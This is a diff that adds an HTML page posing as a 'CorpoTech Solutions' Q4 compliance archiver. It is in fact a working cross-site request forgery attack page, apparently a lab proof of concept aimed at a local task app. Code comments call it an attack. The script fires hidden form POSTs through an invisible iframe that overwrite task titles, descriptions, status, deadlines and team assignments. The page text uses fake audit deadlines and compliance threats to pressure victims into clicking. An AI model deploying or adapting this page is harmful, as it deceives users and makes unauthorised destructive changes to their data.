@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CorpoTech Solutions - Q4 Archiver</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f4f6f9;
+            margin: 0;
+            color: #333;
+        }
+        .header {
+            background-color: #003366;
+            color: white;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+        }
+        .logo { font-size: 24px; font-weight: bold; margin-right: 20px; }
+        .subtitle { font-size: 14px; opacity: 0.8; }
+        .container {
+            max-width: 600px;
+            margin: 50px auto;
+            background: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+            text-align: center;
+        }
+        h2 { color: #003366; }
+        p { line-height: 1.6; color: #555; margin-bottom: 30px; }
+        .btn-archive {
+            background-color: #e67e22;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .btn-archive:hover { background-color: #d35400; }
+        .btn-archive:disabled { background-color: #95a5a6; cursor: not-allowed; }
+        #status-msg {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #666;
+            font-family: monospace;
+        }
+        /* Hidden iframe to catch the POST responses without navigating away */
+        .hidden-frame { width: 0; height: 0; border: 0; border: none; position: absolute; }
+        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">CorpoTech Solutions</div>
+        <div class="subtitle">Legal & Compliance Portal</div>
+    </div>
+
+    <div class="container">
+        <h2>📋 Q4 Fiscal Year Task Archiver</h2>
+        <p>
+            In preparation for the annual external audit, all active tasks must be locked into 
+            read-only mode. Click the button below to execute the mandatory compliance archive 
+            for your assigned tasks.
+        </p>
+        <p style="font-size: 13px; color: #e74c3c; font-weight: bold;">
+            <em>Notice: Failure to complete this step before Friday may result in compliance violation.</em>
+        </p>
+
+        <button id="archive-btn" class="btn-archive" onclick="startArchive()">
+            Execute Q4 Archive
+        </button>
+
+        <div id="status-msg"></div>
+    </div>
+
+    <!-- The iframe where the payloads are fired -->
+    <iframe name="csrf_receiver" class="hidden-frame"></iframe>
+
+    <div class="footer">
+        &copy; 2023 CorpoTech Solutions. Mandatory Compliance Action.
+    </div>
+
+    <script>
+        function startArchive() {
+            const btn = document.getElementById('archive-btn');
+            const status = document.getElementById('status-msg');
+            
+            btn.disabled = true;
+            btn.innerText = "Archiving...";
+            status.innerText = "Connecting to task management API...";
+
+            // The attacker knows the victim has tasks with IDs 1, 2, and 3
+            const targetTasks = [1, 2, 3]; 
+
+            targetTasks.forEach((taskId, index) => {
+                // Stagger the requests by 400ms so they don't overlap and crash the DB
+                setTimeout(() => {
+                    status.innerText = `Locking task ID ${taskId}...`;
+
+                    // 1. Create the form dynamically
+                    const form = document.createElement('form');
+                    form.action = `http://localhost:5000/tasks/${taskId}/edit`;
+                    form.method = 'POST';
+                    form.target = 'csrf_receiver'; // Fire into the hidden iframe
+
+                    // 2. Add the destructive payload
+                    const payload = {
+                        'title': '[AUDIT LOCKED] - DO NOT MODIFY',
+                        'description': 'Task locked by automated Q4 compliance audit script.',
+                        'status': 'done',
+                        'deadline': '',
+                        'team_id': ''
+                    };
+
+                    for (const key in payload) {
+                        const input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = key;
+                        input.value = payload[key];
+                        form.appendChild(input);
+                    }
+
+                    // 3. Fire and forget
+                    document.body.appendChild(form);
+                    form.submit();
+                    document.body.removeChild(form);
+
+                    // Update UI when done
+                    if (index === targetTasks.length - 1) {
+                        setTimeout(() => {
+                            status.innerText = "Status: Archive complete. You may close this window.";
+                            btn.innerText = "Archive Complete";
+                        }, 500);
+                    }
+                }, index * 600); 
+            });
+        }
+    </script>
+</body>
+</html>
